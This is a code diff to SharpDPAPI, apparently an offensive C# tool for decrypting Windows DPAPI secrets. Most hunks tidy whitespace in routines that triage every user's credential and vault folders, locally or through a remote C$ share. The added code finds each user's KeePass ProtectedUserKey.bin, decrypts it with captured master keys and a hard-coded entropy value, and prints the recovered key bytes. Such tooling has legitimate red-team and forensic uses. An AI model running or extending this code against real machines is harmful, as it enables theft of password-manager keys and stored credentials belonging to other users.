@@ -45,7 +45,7 @@ namespace SharpDPAPI
                         try
                         {
                             FileInfo f = new FileInfo(file);
-                            
+
                             if (Helpers.IsGuid(f.Name))
                             {
                                 var masterKeyBytes = File.ReadAllBytes(file);
@@ -292,8 +292,8 @@ namespace SharpDPAPI
             {
                 Console.WriteLine("[*] Triaging Credentials for ALL users\r\n");
 
-                var userFolder = !String.IsNullOrEmpty(computerName) ? 
-                    $"\\\\{computerName}\\C$\\Users\\" : 
+                var userFolder = !String.IsNullOrEmpty(computerName) ?
+                    $"\\\\{computerName}\\C$\\Users\\" :
                     $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
 
                 var dirs = Directory.GetDirectories(userFolder);
@@ -302,8 +302,8 @@ namespace SharpDPAPI
                 {
                     var parts = dir.Split('\\');
                     var userName = parts[parts.Length - 1];
-                    
-                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")) 
+
+                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
                         continue;
 
                     var credentialFilePaths = new string[]
@@ -314,7 +314,7 @@ namespace SharpDPAPI
 
                     foreach (var path in credentialFilePaths)
                     {
-                        if(Directory.Exists(path))
+                        if (Directory.Exists(path))
                             TriageCredFolder(path, MasterKeys);
                     }
                 }
@@ -357,8 +357,8 @@ namespace SharpDPAPI
                 Console.WriteLine("[*] Triaging Vaults for ALL users\r\n");
 
                 var userFolder = "";
-                userFolder = !String.IsNullOrEmpty(computerName) ? 
-                    $"\\\\{computerName}\\C$\\Users\\" : 
+                userFolder = !String.IsNullOrEmpty(computerName) ?
+                    $"\\\\{computerName}\\C$\\Users\\" :
                     $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
 
                 var dirs = Directory.GetDirectories(userFolder);
@@ -367,7 +367,7 @@ namespace SharpDPAPI
                 {
                     var parts = dir.Split('\\');
                     var userName = parts[parts.Length - 1];
-                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")) 
+                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
                         continue;
 
                     string[] folderLocations =
@@ -378,7 +378,7 @@ namespace SharpDPAPI
 
                     foreach (var location in folderLocations)
                     {
-                        if (!Directory.Exists(location)) 
+                        if (!Directory.Exists(location))
                             continue;
 
                         var vaultDirs = Directory.GetDirectories(location);
@@ -404,7 +404,7 @@ namespace SharpDPAPI
 
                 foreach (var vaultPath in vaultPaths)
                 {
-                    if (!Directory.Exists(vaultPath)) 
+                    if (!Directory.Exists(vaultPath))
                         continue;
 
                     var vaultDirs = Directory.GetDirectories(vaultPath);
@@ -441,8 +441,8 @@ namespace SharpDPAPI
                 foreach (var location in folderLocations)
                 {
                     if (!Directory.Exists(location))
-                        continue; 
-                    
+                        continue;
+
                     TriageCredFolder(location, MasterKeys);
                 }
             }
@@ -507,18 +507,18 @@ namespace SharpDPAPI
             var keys = Dpapi.DescribeVaultPolicy(policyBytes, MasterKeys);
 
             // make sure we have keys returned
-            if (keys.Count <= 0) 
+            if (keys.Count <= 0)
                 return;
 
             var vaultCredFiles = Directory.GetFiles(folder);
-            if ((vaultCredFiles == null) || (vaultCredFiles.Length == 0)) 
+            if ((vaultCredFiles == null) || (vaultCredFiles.Length == 0))
                 return;
 
             foreach (var vaultCredFile in vaultCredFiles)
             {
                 var fileName = Path.GetFileName(vaultCredFile);
-                            
-                if (!fileName.EndsWith("vcrd")) 
+
+                if (!fileName.EndsWith("vcrd"))
                     continue;
 
                 try
@@ -538,9 +538,9 @@ namespace SharpDPAPI
         {
             // triage a specific credential folder
             var systemFiles = Directory.GetFiles(folder);
-            if (systemFiles.Length == 0) 
+            if (systemFiles.Length == 0)
                 return;
-            
+
             Console.WriteLine("\r\nFolder       : {0}\r\n", folder);
 
             foreach (var file in systemFiles)
@@ -735,6 +735,72 @@ namespace SharpDPAPI
                     continue;
 
                 TriageCertFolder(userCngKeysPath, MasterKeys, true, showall);
+            }
+        }
+
+        public static void TriageKeePassKeyFile(Dictionary<string, string> MasterKeys, string keyFilePath = "", bool unprotect = false) {
+            
+            if (!File.Exists(keyFilePath))
+                return;
+
+            var lastAccessed = File.GetLastAccessTime(keyFilePath);
+            var lastModified = File.GetLastWriteTime(keyFilePath);
+
+            Console.WriteLine("    File             : {0}", keyFilePath);
+            Console.WriteLine("    Accessed         : {0}", lastAccessed);
+            Console.WriteLine("    Modified         : {0}", lastModified);
+
+            byte[] keyFileBytes = File.ReadAllBytes(keyFilePath);
+
+            // entropy from KeePass source https://fossies.org/windows/misc/KeePass-2.47-Source.zip/KeePassLib/Keys/KcpUserAccount.cs (lines 44-47)
+            byte[] keyBytes = Dpapi.DescribeDPAPIBlob(keyFileBytes, MasterKeys, "keepass", unprotect, Helpers.ConvertHexStringToByteArray("DE135B5F18A34670B2572429698898E6"));
+            if(keyBytes.Length > 0)
+            {
+                Console.WriteLine("    Key Bytes        : {0}", BitConverter.ToString(keyBytes).Replace("-"," "));
+            }
+        }
+
+        public static void TriageKeePass(Dictionary<string, string> MasterKeys, string computerName = "", bool unprotect = false)
+        {
+            // search for ProtectedUserKey.bin files, TriageKeePassKeyFile()
+
+            if (!String.IsNullOrEmpty(computerName))
+            {
+                // if we're triaging a remote computer, check connectivity first
+                var canAccess = Helpers.TestRemote(computerName);
+                if (!canAccess)
+                {
+                    return;
+                }
+            }
+
+            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
+            {
+                Console.WriteLine("[*] Triaging KeePass ProtectedUserKey.bin files for ALL users\r\n");
+
+                var userFolder = "";
+                userFolder = !String.IsNullOrEmpty(computerName) ?
+                    $"\\\\{computerName}\\C$\\Users\\" :
+                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
+
+                var dirs = Directory.GetDirectories(userFolder);
+
+                foreach (var dir in dirs)
+                {
+                    var parts = dir.Split('\\');
+
+                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
+                        continue;
+
+                    var keyfilePath = $"{dir}\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin";
+                    TriageKeePassKeyFile(MasterKeys, keyfilePath, unprotect);
+                }
+            }
+            else
+            {
+                Console.WriteLine("[*] Triaging KeePass ProtectedUserKey.bin files for current user\r\n");
+                var keyfilePath = $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin";
+                TriageKeePassKeyFile(MasterKeys, keyfilePath, unprotect);
             }
         }
 
